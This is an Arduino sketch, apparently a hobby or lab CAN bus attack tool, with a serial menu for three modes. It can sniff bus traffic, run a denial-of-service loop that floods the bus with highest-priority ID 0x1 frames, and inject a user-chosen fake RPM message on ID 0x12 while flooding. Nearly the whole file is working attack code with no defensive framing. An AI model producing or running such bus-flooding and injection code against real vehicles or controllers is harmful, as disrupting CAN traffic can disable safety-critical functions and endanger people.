#include <CAN.h>
int r=0;
void sniff();
void dos();
void injectm();
void setup() {
  Serial.begin(9600);
  while (!Serial);
  Serial.println("CAN Receiver");
  Serial.println("Select mode:");
  Serial.println("1. Sniffing");
  Serial.println("2. Denial of Service (DOS)");
  Serial.println("3. Message Injection");
   
  if (!CAN.begin(500E3)) {
    Serial.println("Starting CAN failed!");
    while (1);
  }
}

void loop() {
  r=Serial.parseInt();
  if (r == 1) {
    sniff();
  } else if (r == 2) {
    dos();
  } else if (r == 3) {
    injectm();
  }
  }

void sniff()
{
  Serial.println("Sniffing....");
  while (1>0)
  {
  int packetSize = CAN.parsePacket();

  if (packetSize || CAN.packetId() != -1) 
  {
        Serial.print("Received ");

    if (CAN.packetExtended()) {
      Serial.print("extended ");
    }

    if (CAN.packetRtr()) {
      Serial.print("RTR ");
    }

    Serial.print("packet with id 0x");
    Serial.print(CAN.packetId(), HEX);

    if (CAN.packetRtr()) {
      Serial.print(" and requested length ");
      Serial.println(CAN.packetDlc());
    } else {
      Serial.print(" and length ");
      Serial.println(packetSize);

      while (CAN.available()) {
        Serial.print((char)CAN.read());
      }
      Serial.println();
    }

    Serial.println();
  }
  }
}

  void dos(){
  Serial.println("Denial of Service in process....");
   while(1>0){
    CAN.beginPacket(0x1); 
    CAN.write(' ');
    CAN.endPacket();
   }
}
 void injectm(){
  int k=0;
  Serial.println("Enter the RPM value");
   while (Serial.available() == 0) {

  }
  delay(4000);
  k = Serial.parseInt();
  Serial.print("rpm enter is ");
  Serial.println(k);
  Serial.println("Injection in process....");
  while(1>0)
  {
  char rpm[8];
  snprintf(rpm, sizeof(rpm), "rpm=%d", k);
  CAN.beginPacket(0x1); 
  CAN.write(' ');
  CAN.endPacket();
  CAN.beginPacket(0x12);
  for(int i=0;rpm[i]!='\0';i++)
  {
   CAN.write(rpm[i]); 
  }
  
  CAN.endPacket();
  }
}
